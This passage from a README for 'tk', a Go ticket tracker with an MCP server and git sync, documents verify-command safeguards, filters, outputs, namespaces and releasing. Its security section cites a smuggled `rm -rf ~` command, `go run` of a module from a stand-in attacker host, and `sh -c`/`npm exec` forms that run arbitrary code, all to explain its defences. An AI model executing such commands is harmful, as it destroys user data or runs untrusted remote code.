**No shell.** The command is split into arguments on whitespace — single and double quotes group an argument, so `-run 'TestA|TestB'` survives whole — and then exec'd directly. Nothing is expanded and nothing is interpreted: `;`, `|`, `&&`, `$(...)`, backticks, `*` and `~` are literal characters handed to the program as part of an argument. `go test ./...; rm -rf ~` runs `go` with the arguments `test`, `./...;`, `rm`, `-rf`, `~` — `go` rejects the nonsense arguments, and nothing is deleted.

**Allow-list.** The program — the first word — must exactly match an entry in `verify_allow` in your machine-local `~/.ticket/config.yaml`. Matching is exact string equality, not by basename, so an entry of `go` does not admit `/tmp/evil/go`. Anything else is `refused`: it never runs, and the refusal names the command and how to permit it.

An entry names a lookup, not a fixed file: a bare `go` resolves through tk's `PATH` when the command is exec'd, and a relative entry such as `./scripts/check.sh` resolves against the project directory the command runs in — the same working tree your agents write to. Use an absolute path to pin a specific binary.

```yaml
# ~/.ticket/config.yaml
verify_allow:
  - go
  - make
  - ./scripts/check.sh
```

Three spellings, and only the first one grants anything:

- **Key absent** — the list defaults to `go`, `make`, `cargo`, `pytest`.
- **`verify_allow: []`** — refuses everything.
- **`verify_allow:` with no value** — also refuses everything. YAML reads a valueless key as null, but tk treats writing the key at all as intent to refuse, so locking a machine down this way does not quietly hand the defaults back.

A `~/.ticket/config.yaml` that cannot be parsed refuses everything too — a half-written or conflicted config never restores the defaults over a list you had narrowed.

**What listing a program actually grants.** An entry is not a claim that the program is safe. It trusts whoever can write a verify line with everything that program can do, including the forms that run code from outside your repo:

- `go run example.com/attacker/x@latest` and `go install pkg@version` fetch and execute a remote module, ignoring the checked-out repo entirely.
- `cargo install <crate>` fetches a remote crate and executes its `build.rs` at build time — the direct analogue of `go install`.
- `make -f /path/to/anything` and `make -C <dir>` run recipes from a file the command line names rather than the repo's Makefile.

They are in the default, because `go test` is the point of the feature and cannot be dropped over them. What the default buys you is that a verify line cannot name an arbitrary program — not that the listed ones are confined to the repo. Shells and interpreters are left out because they remove even that while buying nothing back: `sh -c '<anything>'` or `python3 -c '<anything>'` runs whatever string the ticket supplied.

`swift` is left out on that rule, not as a build driver: `swift -e '<code>'` runs arbitrary Swift with the full standard library, the same unconditional reach that keeps `sh` and `python3` out — and unlike `go run pkg@version` it needs no remote module and no network. A Swift project gets `swift test` back by adding `swift` to `verify_allow`, accepting that a verify line can then run any Swift the ticket names.

`npm`, `pnpm` and `yarn` are left out for the same reason — `npm exec <pkg>`, `pnpm dlx` and `yarn dlx` fetch and run an arbitrary package off the registry as a documented feature. A JS project that adds one back is opting into a verify line being able to run any published package, which may well be an acceptable trade in a repo whose `npm test` already runs whatever `package.json` says. Add it deliberately, not by default.

The list is read from `~/.ticket/config.yaml` alone. `verify_allow` in the shared `<central_root>/config.yaml` is ignored, because that file syncs over the same remote that would carry a hostile command — one push would otherwise plant the command and widen the list that should refuse it. There is no flag, no MCP argument and no ticket field that grants permission: **an agent can run what you have already allowed, and can authorize nothing further.** Only you, editing your own machine's config file, widen the list.

**Timeout.** Each command is bounded by `verify_timeout` under the project in your machine-local `~/.ticket/config.yaml`, beside its `path`: a Go duration such as `300s` or `5m`, defaulting to 120s when the key is absent. It is read from that file alone — a `verify_timeout` in the shared `<central_root>/config.yaml` is ignored, and no flag, MCP argument or ticket field sets it — because the bound is a property of your machine and its suite, while a ticket replicates to every machine that syncs the store. A value that does not parse as a positive duration refuses every verify command in that project, naming the key and the value: a typo fails closed rather than silently restoring the 120s the project moved away from.

Both `verify_allow` and `verify_timeout` are read at the start of each verify run rather than at process start, so an edit to `~/.ticket/config.yaml` is picked up by an already-running `tk serve` on its next call — no restart. The exception is a `tk serve` process older than the build that introduced a setting: a binary that predates `verify_timeout` cannot honour it however current the file is, and applies the 120s it was built with, so restart the server after upgrading tk. A timed-out command's output says which of the two it was, naming the bound as the project's `verify_timeout` or as the default.

A refusal is reported as `refused`, never as a failure, and counted separately in the summary and the recorded results — a criterion that never ran is not a criterion that disagreed. Control characters — C0/C1, DEL and the Unicode format characters, including the bidi overrides — are stripped from both the criterion text and the command before they are printed or recorded, so an escape planted anywhere in a ticket's acceptance criteria cannot repaint the terminal you are reading the verdict on, nor replay on every later `tk show`. Tabs survive, being ordinary in a markdown bullet and harmless on a terminal. The stripping covers the criterion text and its command, and not a command's own output: that is printed as the program emitted it, so coloured test output stays readable.

### Filter Flags

```
--status X        Filter by status (backlog, ready, open, done, closed)
--all             Include done and closed, which the default hides
-t, --type X      bug | feature | epic
-P, --priority X  0 (critical) through 4 (backlog)
-T, --tag X       Filter by tag
--field key=val   Filter by extra field (substring match)
--parent X        Children of epic X (qualified project/id, or bare in the
                  selected project); membership is global, the listing is
                  the selected project's
--all-projects    Every namespace in the central store, IDs qualified;
                  conflicts with --project
--group-by X      Group by: workflow | type | priority
--flat            Flat list (no grouping)
```

A default `tk ls` lists live work only — `done` and `closed` are hidden, so finished tickets do not bury the rows you are scanning for. Reach them with `--status done` / `--status closed`, or with `--all`, which shows the whole board in one listing (`--status` only ever shows one status at a time). Since an epic reads the status its children imply, a finished epic drops out of the default listing along with its children.

### Extra Fields

Tickets support arbitrary custom key/value metadata via `--set`:

```bash
tk create "Deploy config" --set env=production --set region=us-east
tk edit <id> --set env=staging        # update
tk edit <id> --set env=               # remove
```

Extra fields appear in `tk show` output, `tk query` JSONL (under `extra`), and MCP responses.

Filter the list by an extra field with substring matching:

```bash
tk ls --field env=prod        # matches env=production
```

### Outputs

A ticket records what it produced in an `outputs` frontmatter block — the handoff for downstream tickets:

```yaml
outputs:
  branch: add-outputs-1234
  commit: 31fc605
  artifact: dist/tk
```

Keys are freeform (letters, digits, hyphens, underscores); `branch` and `commit` are the well-known ones. Values are written as plain unquoted YAML scalars, so YAML indicator characters and surrounding whitespace are rejected. Set them with `--output` on `tk edit`, or the `outputs` argument on the `ticket_edit` MCP tool:

```bash
tk edit <id> --output artifact=dist/tk --output commit=31fc605
tk edit <id> --output artifact=            # remove
```

Outputs are populated automatically when a ticket lands: the commit watcher records the closing commit's SHA and branch on auto-close, and marking a ticket `done` from anywhere (CLI, MCP, or TUI) copies its `branch` field. Existing values are never overwritten, so anything set by hand wins; a derived value that would not serialize cleanly is dropped rather than written.

`tk show` renders them as an `## Outputs` section, and they appear under `outputs` in `tk query` JSONL and MCP responses.

### Bulk Operations

Move all ready tickets to backlog:

```bash
tk query '.status == "ready"' | jq -r '.id' | xargs -I{} tk edit {} --status backlog
```

Partial ID matching: `tk show 5c4` matches `nw-5c46`.

### Moving Tickets Between Repos

```bash
tk move <id> ~/code/other-repo        # one isolated leaf
```

The target is a repo path, and it resolves to the project that repo owns in the central store. A repo that owns none is refused — no store is created for it, since a directory nothing else reads would orphan whatever landed there. A project that has a central directory but is not registered `store: central` is warned about by name: the move lands there, but nothing else writes to it. A target that resolves to the store the ticket already lives in is refused by project name and nothing is written — the move would rename the ticket rather than move it, giving it a new ID and closing the one other tickets and commit messages reference. Re-parenting a ticket within its project is `tk edit --parent`.

The ticket is created in the destination with a new ID in that project's namespace, and the original is closed rather than deleted, so it is hidden from a default `tk ls` — list moved tickets with `tk ls --status=closed`. A move is copy-and-close, not reassignment, so only an isolated leaf moves: a ticket with a `parent`, `deps` or `links`, one that any other ticket names as its parent, dep or link, and any epic are refused before anything is written, naming the relationship — the copy would leave those references pointing at a closed copy, or strip them, and a blocker that reads satisfied while its replacement is unfinished corrupts the plan. `-r`/`--recursive` is refused on the same grounds. The move also needs the whole store read: an unreadable file anywhere in it could be a ticket naming the one that is moving. The move is not atomic: the destination copy is written first, and a failure closing the source names the orphaned copy.

### Git Sync

`tk serve` automatically commits and pushes ticket changes every 5 seconds. For manual sync:

```bash
tk sync
```

If a push conflict occurs, tk attempts `pull --rebase`. If rebase fails, sync is blocked and a `.tk-sync-blocked` marker is written. Resolve the conflict manually, then sync resumes on the next cycle.

A cycle is split around the store lock every ticket write takes. The fetch and the push run outside it — the network half never holds the store. The rebase pull, the guards, staging and the commit run under it, exclusively, so no writer lands a ticket mid-rebase or mid-commit and no reader snapshots a half-applied merge. A lock that cannot be taken skips the cycle with `sync skipped: store lock: …` and no marker — a stuck writer is transient. A rebase pull that moved HEAD is followed by a read of the merged store: a namespace or file it cannot read, or a ticket whose parent the graph refuses, is reported as `sync: merged store has N diagnostic(s) and M invalid relationship(s); epics cannot certify completion and affected leaves are not runnable — run tk audit`. It is a report, not a block — the commit and push still land, and the snapshot already keeps such an epic from reading done and such a leaf out of the frontier — so sync never claims a clean success over a merge the graph refuses.

A store root nested inside a repo tk does not own is the exception: there the rebase would stash that repo owner's whole uncommitted worktree and rebase their current branch, so tk refuses it and blocks with a marker naming the repository instead. The refusal is on the rebase alone — commits and pushes are never gated by the nested topology, so the store keeps publishing on every cycle where the enclosing branch is not behind its upstream. Once it *is* behind, the cycle stops at the marker: nothing of the store's is committed or pushed until the divergence is reconciled by hand in the enclosing repository, and the cycle after that clears the marker and resumes.

### Commit Journal

`tk watch` — and the same loop inside `tk serve` — reads each registered project's git history and appends one line per commit that names a ticket to `~/.ticket/state/<project>/commits.jsonl`. A commit names a ticket with a bracket ref in its message: `[<id>]` links the commit to the ticket, and `Closes:` or `Fixes:` before the ref also marks the ticket `done`. Both the bare `[slug-hash]` and the namespaced `[project/slug-hash]` form the central store hands agents are matched; a ref naming the project being journalled is recorded under its bare ID, and one naming another project is left for that project to resolve. A commit closes tickets in its own project only: a `Closes:` ref naming another project's ticket, or a Root ticket (`_root/…`, which has no repository), is journalled as named and the close is warned and skipped — never resolved against the store.

Two per-project flags in the shared config decide it: `auto_link` writes the journal entries, `auto_close` performs the auto-close. `tk init` sets both to `true`, and a project registered before that — the flags were hardcoded to `false` — is flipped to `true` once, the first time a watcher opens the store. The flip touches only projects with *both* flags off, since a mixed pair is a deliberate link-only or close-only choice; it runs once ever, recorded as `journal_defaults_migrated: true` in `<central_root>/config.yaml`, so turning journaling off afterwards sticks. Both flags stay written out per project, so either can be edited back.

`tk watch status` lists every project with its flags, and the watcher logs the same summary at startup and whenever a config reload changes it — a watcher that runs but journals nothing says so.

#### `auto_retrospect`

A third per-project flag, off by default and set by hand in `<central_root>/config.yaml`, hands each newly closed ticket to `loom`, the knowledge miner: every cycle, the watcher scans the project's store for tickets reading `done` or `closed` with no marker yet and runs `loom retrospect <project>/<id>` for each. Neither `tk init` nor the journal-defaults migration touches it. The trigger sits on the watch cycle rather than in the tool that closed the ticket, so it catches every close — a commit `Closes:`, `tk edit`, the TUI, an MCP write. Epics are skipped: an epic's `done` is derived from its children, each of which fires its own retrospect.

Each fired ticket is recorded in `~/.ticket/state/<project>/retrospects.jsonl`, so nothing fires twice. The marker is keyed on the ticket ID alone: a ticket reopened and closed again is never mined a second time, deliberately — one lost run costs that ticket's candidates, where a duplicate spends another extraction and files the same ones again. Turning the flag on does *not* mine the store's history: the first cycle records every already-closed ticket without firing and says so in the log, and only closes after that are mined. A cycle starts at most four runs, so a batch of closes arriving at once — a store that just synced, or the backlog a missing `loom` left pending — is spread over the cycles that follow; the truncation is reported in the log and the rest fire seconds later. Everything about it is best-effort — the runs are started and left to finish on their own so an extraction never stalls the watcher, and a missing or failing `loom` is a log line, never an interrupted cycle. When `loom` is not on `PATH` nothing is recorded, so the pending closes fire on the first cycle after it is installed.

### Mutation Log

Every ticket change is appended to `~/.ticket/state/<project>/mutations.jsonl`, a sibling of the commit journal: one JSON line carrying `timestamp`, `ticket_id`, `operation` (`create`, `edit`, `add-note`, `dep`, `link`, `delete`, `move`), `source` and `fields_changed`. It is the trail git history cannot give — a ticket changes far more often than the store is committed.

`source` names the writer: `TK_SOURCE` wins wherever it is set, otherwise each surface supplies its own default — the MCP client name from the handshake, or a write tool's explicit `source` argument; `watch` for the journal watcher's auto-closes; `human` for the CLI and TUI. It is declared by the writer and not authenticated: the log records which cooperating tool wrote a change, not proof of who did.

### Multi-Project Serving

`tk serve` starts the MCP server with a `MultiStore` that serves all projects from the central ticket store. Ticket IDs are namespaced as `project/ticket-id`.

**Default project scoping:**
- When run from inside a project repo, tools default to that project's tickets
- When run outside any repo, tools return tickets from all projects
- The `project` parameter on `ticket_list`, `ticket_frontier`, `ticket_search`, `ticket_ready`, `ticket_blocked`, `ticket_inbox` and `ticket_create` overrides the default; `all_projects=true` on the listing tools sets the default aside and lists every namespace (passing both is refused)

Other tools (`ticket_show`, `ticket_edit`, etc.) accept namespaced IDs directly — pass `forge/my-ticket-1234` to operate on a specific project's ticket.

#### Global queries and Root

Every listing is answered off the whole store first and narrowed afterwards. A `project` scope, and the closed filter, narrow the rows only: which epic a child belongs to, whether a ticket is ready or blocked, and what status an epic derives are all decided over every namespace before the scope applies, so a project view and the central view never disagree. This is the contract weft and warp consume; the CLI flags above are the same rules.

- **Scope.** `all_projects` on `ticket_list`, `ticket_frontier`, `ticket_search`, `ticket_ready`, `ticket_blocked` and `ticket_inbox` lists every namespace and ignores the server's default project; it conflicts with `project`. `ticket_list` also takes `include_closed=true` to keep closed tickets in the rows (dropped by default unless `status` is set), so cancelled children of an epic are reachable.
- **Parent.** `parent` on `ticket_list` and `ticket_frontier` keeps only the children the graph places under that epic, in every namespace: a qualified `project/id`, or a bare ID relative to `project` (or the default project) — with neither, a bare parent is refused rather than searched for, since identical bare IDs exist in different projects. A parent that does not resolve, or is not an epic, is a refusal and never an empty listing. The response then carries `parent`: the epic's `id`, derived `status`, `type`, `complete`, `children_total` and `counts` (`done`, `closed`, `open`, `ready`, `backlog`) over every child in every namespace, whatever `project` or the closed filter hid from the rows, so a consumer can tell a slice from the epic's whole.
- **Snapshot.** `ticket_list`, `ticket_frontier` and `ticket_search` responses carry `snapshot`, the revision token of the one store reading the response was cut from, and `complete`, whether that reading saw the whole store; `ticket_list` also carries `namespaces`, the namespaces read in full. A paged `ticket_list` passes the first page's `snapshot` back on every later page: a page at an offset above 0 without it is refused, a store that changed in between is refused with `snapshot changed`, naming the new token, and the caller restarts from offset 0 — two revisions are never mixed into one membership or total.
- **Show.** `ticket_show` carries `namespace` (the ticket's project, empty on a single store). An epic also carries `children` (`id`, `title`, `status`, `type`, `namespace` — every child in every namespace, IDs qualified), `children_total`, `counts` and `complete`, all off one reading so the derived status and the counts agree; while `complete` is false, `diagnostics` names what could not be read and the epic reads neither done nor closed. A leaf whose parent does not make it a child carries `relationship_issue` saying why. A done dependency in another project is not a blocker.
- **Create.** `ticket_create`'s destination is `project` — a registered project, or `_root` for an idea with no repository yet, refused until the catalog requires `root-namespace` — or `repo`, or the server's default project; with none of the three the create is refused (`no destination: pass project … or repo`) rather than landing somewhere inferred. `parent` may name an epic in another namespace, qualified, once the catalog requires `cross-project-parents`.
- **Verify.** `ticket_verify` runs commands only in the checkout registered on this machine for the ticket's own project. A Root ticket (Root has no repository), a project with no checkout registered here, and a registered checkout that is missing are each refused before anything runs, naming the reason, and nothing is recorded; the server's working directory, the store and a parent epic's project never stand in.

### Namespaces, Root and the catalog

A **namespace** is one directory under `<central_root>/tickets/` and the first half of every `project/id`. A **project** is a namespace with a repository registered behind it on some machine — the `path` in `~/.ticket/config.yaml` and `store: central` in the shared config. Registration is machine-local; the namespace is shared.

**Root** is the built-in namespace `_root`, for ideas that need a stable home before they have a repository. It is always in the inventory and is bound to no repository — `tk init` refuses to register it, so nothing a registration drives (the journal watcher, auto-close) ever runs for it. Its tickets keep the ordinary `_root/slug-hash` shape, so nothing about IDs changes when an idea later becomes a project: register the real repository and file the implementation tickets there.

`<central_root>/catalog.yaml` is the shared **namespace catalog**. It sits beside `config.yaml`, outside every namespace directory, and syncs with the store:

```yaml
required_features:
  - root-namespace
namespaces:
  _root: {kind: root}
  warp:  {kind: project}
  code:  {kind: legacy}
```

`kind` is `root` for Root, `project` for a registered project, and `legacy` for a directory that predates the catalog and has no repository registration — admitting one invents no registration and moves nothing. `required_features` is both the compatibility contract and the activation marker: every binary sharing the store must implement each feature listed, and `root-namespace` being listed is what allows writes to `_root`. A `.namespace` marker inside each namespace directory keeps an empty namespace in git, so one that has never held a ticket survives a clone and reads as *empty* rather than *missing*.

`ticket.ReadInventory` is the read-only view consumers take of this: every namespace with its kind, registration, repo path, directory, marker and state, plus `Complete` and `Diagnostics`. No catalog, a catalogued namespace with no directory or marker, a config entry binding `_root` to a repository, or a required feature this binary lacks each make the inventory incomplete and are named — never reported as an empty, healthy store. A malformed catalog or config is an error, not an empty result.

**Cross-project parents.** `cross-project-parents` in `required_features` is what lets a leaf name an epic in another namespace as its parent. The relationship graph is read the same way before and after: the snapshot every reader and writer shares (`FileStore.Snapshot`, `MultiStore.Snapshot`) resolves references relative to their owner, derives every epic from its children in every namespace, and reports what it could not read. Every write takes one cross-process store lock — a file under the user's cache directory, never in the synced tree — validates against the snapshot taken under it, and only then takes the per-ticket lock; a callback handed to `ticket.Mutate` must not reach back through the store (an `Update`, a `Mutate`, a listing, or a `Get` of an epic), which is refused with `ErrStoreLockTimeout` rather than allowed to deadlock.

**Compatibility.** Every central write — CLI, TUI, MCP, embedded library — passes one guard before it touches the store: a catalog requiring a feature outside `ticket.SupportedFeatures` refuses the write and says the binary must be replaced, and a write to `_root` is refused until `root-namespace` is required. Reads are never gated, and a store with no catalog behaves exactly as it did before the catalog existed. The guard only protects binaries that carry it: **tk binaries released before this guard ignore the catalog and the markers entirely**, so activating Root requires coordinated replacement of every tk binary, embedded library and long-lived process (MCP servers, watchers) sharing the store — a marker alone cannot make an already-released binary refuse. No command activates Root yet; `ticket.PreflightActivation` reports what would block it (a `_root` config entry, or a `_root` directory not catalogued as Root) and adopts or moves nothing.

### Isolated stores (`TK_STORE_ROOT`)

Set `TK_STORE_ROOT` to an absolute path and tk resolves its whole store against that root instead of the configured `central_root` — for a test harness driving `tk serve`, or anything else that must not write to the real store:

```bash
TK_STORE_ROOT=/tmp/tk-sandbox tk serve
```

With the override set:

- The store is `<root>/tickets/<project>/`, the shared config `<root>/config.yaml`, and the local config `<root>/.ticket/config.yaml`. Neither the configured store tree nor `~/.ticket/config.yaml` is read or written.
- `tk serve` starts without a `~/.ticket/config.yaml` at all — the override is the configuration.
- No sync and no journal watch run, so nothing is committed or pushed and no ticket is auto-closed. `tk serve` starts neither loop (and logs that it did not), and `tk sync`, `tk watch` and `tk recompute` refuse to run at all: sync would commit and push whatever git repo encloses the sandbox, and the commit journal stays under `$HOME`, which the override does not move — so watch would auto-close sandbox tickets while journalling into the real home, and recompute would delete and rebuild your journal for any project name the sandbox happens to register. The commit journal is the one *store* path `$HOME` still decides; every other store path the override resolves for itself, the mutation log included — it is appended by every write and so cannot be refused the way those commands are, and under the override it lands at `<root>/state/<project>/mutations.jsonl` rather than in the machine's real audit trail.
- `tk init` still registers a project — a harness needs it to, since central writes to an unregistered project are refused — but it skips the store's git bootstrap. A throwaway store keeps no history, and bootstrapping one nested inside another repo would stage and commit that repo's worktree.
- `verify_allow` and `spawn_command` are the settings the override does not move: both are read from `~/.ticket/config.yaml` always. The override root belongs to whoever set the variable, and each of these decides code that runs as you — so following it there would let a sandbox widen the allow-list (`verify_allow: [sh]`) or hand the TUI its own `sh -c` template, and a sandbox with no config would restore the defaults over an allow-list you had narrowed. Pinning them to `$HOME` bounds what a *store root* can supply, not a caller who also controls the environment: whoever can set `TK_STORE_ROOT` can generally set `HOME` too.
- A value that is not an absolute path is an error, on any command, before any store is resolved. There is no fall-back to the configured store — a silent fall-back is the failure this exists to prevent. The empty string is such a value: `TK_STORE_ROOT=` is a store root tk cannot resolve, not an unset variable.

The guarantee covers tk's own store resolution and nothing wider. Two things are outside it, by design and under separate controls:

- **`ticket_create`'s `repo` argument.** It resolves a caller-supplied absolute path before any config lookup, so its write target sits outside the override by construction.
- **Commands a ticket's `verify` lines run.** `verify_allow` defaults include `go` and `make`, and `go run pkg@version` or `make -f <file>` run code from outside the repo — code that can reach any path. The allow-list is pinned to `~/.ticket/config.yaml`, but the *directory* a verify command runs in is not: it comes from the project `path` in whichever config wins, so under the override the sandbox root names it — `make` there runs that directory's Makefile. See [What may run](#what-may-run).

## Development

### Testing the MCP server locally

`.mcp.json` includes a dev server entry (disabled by default) pointing to the locally built `./tk` binary:

- **`tk-dev`** — multi-project mode (`./tk serve`)

To test MCP changes:

1. Build the binary:
   ```bash
   go build -o tk .
   ```

2. In Claude Code, open `/mcp` and:
   - Disable the global `plugin:forge:tk` server
   - Enable `tk-dev`

3. When done, swap back: disable the dev server, re-enable `plugin:forge:tk`.

## Releasing

The git tag is the single source of truth for the version. There is no version constant in source: `cmd/root.go` declares `Version = "dev"`, and GoReleaser injects the tag's value via ldflags at build time. **Tagging is what releases** — pushing a `v*` tag triggers the build.

Pick the new version from the `[Unreleased]` changelog entries against the latest tag: new `Added`/`Changed` items → minor bump (`7.5.1` → `7.6.0`); `Fixed`-only → patch bump (`7.5.0` → `7.5.1`).

1. Run the tests — must be green:

   ```bash
   go test ./...
   ```

2. Update `CHANGELOG.md` — rename the `[Unreleased]` heading to a versioned heading with today's date:

   ```markdown
   ## [7.6.0] - 2026-06-08
   ```

3. Commit, then tag and push (commit and tag are pushed separately):

   ```bash
   git commit -am "release: v7.6.0"
   git tag v7.6.0
   git push
   git push origin v7.6.0
   ```

4. The `v*` tag push triggers GitHub Actions (`release --clean`); plain `master` pushes run CI only:
   - **GoReleaser** builds darwin/linux binaries (amd64 + arm64) and publishes a GitHub release with archives + checksums
   - **Homebrew** tap updated in `EnderRealm/homebrew-tools`

Required repository secrets: `GITHUB_TOKEN`, `TAP_GITHUB_TOKEN`.

### Monitoring & Debugging Releases

```bash
# Watch the release workflow
gh run list --limit 1
gh run watch <run-id> --exit-status

# If it fails, check logs
gh run view --log-failed

# If assets were partially uploaded (rerun fails with "already_exists"),
# delete the draft release and retry
gh release delete v2.1.0 --yes
gh run rerun --failed
```

`TAP_GITHUB_TOKEN` is a fine-grained PAT with Contents (read & write) permission on `EnderRealm/homebrew-tools`. If it expires, the Homebrew step will fail with a 401. Regenerate and update:

```bash
gh secret set TAP_GITHUB_TOKEN
```

## License

MIT
